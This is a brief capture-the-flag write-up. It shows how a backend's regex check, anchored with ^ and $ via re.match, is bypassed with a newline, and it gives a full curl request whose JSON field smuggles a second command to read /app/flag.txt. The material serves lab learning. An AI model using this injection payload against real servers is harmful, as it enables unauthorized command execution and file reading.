# Resolution steps
This simulate situation where a server has been fully controlled by bad hackers
Source code has been given

Revelling of flag in `/app/flag.txt`
Issue resides in the usage of regex `re.match("^%s$")`
It is vulnerable to multiline

Backend script wasn't sanitized 

Using curl show the flag
```
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"command": "leaks\ncat /app/flag.txt"}' \
     http://10.1.71.5/
```

CF: https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/